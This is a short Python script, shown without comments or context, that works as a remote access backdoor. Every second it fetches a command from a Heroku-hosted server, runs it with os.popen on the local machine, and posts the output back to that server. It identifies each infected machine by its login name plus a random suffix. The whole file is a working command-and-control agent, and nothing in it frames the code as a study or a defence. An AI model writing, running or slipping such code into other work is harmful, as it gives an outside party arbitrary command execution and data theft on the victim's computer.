import requests
from os import getlogin, popen
from secrets import token_hex
import threading

def set_interval(func, sec):
  def func_wrapper():
    set_interval(func, sec)
    func()
  t = threading.Timer(sec, func_wrapper)
  t.start()
  return t

url = 'https://data-leaf.herokuapp.com'

username = getlogin() + '.' + token_hex(4)
print(username)

def request_command():
  command = requests.get(url + '/get/' + username).text
  stream = popen(command, shell=False)
  data = stream.read()
  stream.close()
  requests.post(url + '/data/' + username, data=data)

set_interval(request_command, 1)
request_command()